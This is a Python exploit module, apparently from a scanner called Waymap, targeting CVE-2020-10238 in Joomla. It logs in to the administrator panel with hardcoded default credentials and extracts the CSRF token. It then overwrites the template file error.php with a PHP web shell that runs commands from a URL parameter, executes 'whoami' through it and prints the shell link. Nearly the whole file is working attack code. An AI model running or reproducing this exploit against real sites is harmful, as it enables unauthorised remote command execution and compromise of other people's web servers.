# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2020-10238

import sys
import requests
import re
from colorama import Fore, Style, init
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init()

def extract_token(resp):
    match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
    if match is None:
        print(f"{Fore.RED}{Style.BRIGHT}Cannot find CSRF token!{Style.RESET_ALL}")
        return None
    return match.group(1)

def try_admin_login(sess, url, uname, upass):
    admin_url = url + '/administrator/index.php'
    print(f'{Fore.YELLOW}Getting token for admin login{Style.RESET_ALL}')
    resp = sess.get(admin_url, verify=False)
    token = extract_token(resp)
    if not token:
        return False
    print(f'{Fore.YELLOW}Logging in to admin{Style.RESET_ALL}')
    data = {
        'username': uname,
        'passwd': upass,
        'task': 'login',
        token: '1'
    }
    resp = sess.post(admin_url, data=data, verify=False)
    if 'task=profile.edit' not in resp.text:
        print(f'{Fore.RED}Admin Login Failure!{Style.RESET_ALL}')
        return None
    print(f'{Fore.GREEN}{Style.BRIGHT}Admin Login Successfully! Username: {uname}, Password: {upass}{Style.RESET_ALL}')
    return True

def check_admin(sess, url):
    url_check = url + '/administrator/index.php?option=com_templates'
    resp = sess.get(url_check, verify=False)
    token = extract_token(resp)
    if not token:
        print(f"{Fore.RED}{Style.BRIGHT}You are not administrator!{Style.RESET_ALL}")
        sys.exit()
    return token

def rce(sess, url, cmd, token):
    filename = 'error.php'
    shlink = url + '/administrator/index.php?option=com_templates&view=template&id=506&file=506&file=L2Vycm9yLnBocA%3D%3D'
    shdata_up = {
        'jform[source]': "<?php echo 'Hacked by HK\n' ;system($_GET['cmd']); ?>",
        'task': 'template.apply',
        token: '1',
        'jform[extension_id]': '506',
        'jform[filename]': '/' + filename
    }
    sess.post(shlink, data=shdata_up)
    path2shell = '/templates/protostar/error.php?cmd=' + cmd
    print(f'{Fore.GREEN}Checking shell:{Style.RESET_ALL}')
    shreq = sess.get(url + path2shell)
    shresp = shreq.text
    print(shresp + f'{Fore.GREEN}Shell link: \n' + (url + path2shell) + f'{Style.RESET_ALL}')
    print(f'{Fore.GREEN}{Style.BRIGHT}Module finished.{Style.RESET_ALL}')

def scan_cve_2020_10238(target):
    uname = 'admin'  
    upass = 'password123'  
    cmd = 'whoami' 
    sess = requests.Session()
    
    print(f'{Fore.CYAN}{Style.BRIGHT}Target: {target}{Style.RESET_ALL}')
    
    if not try_admin_login(sess, target, uname, upass):
        sys.exit()

    token = check_admin(sess, target)

    rce(sess, target, cmd, token)

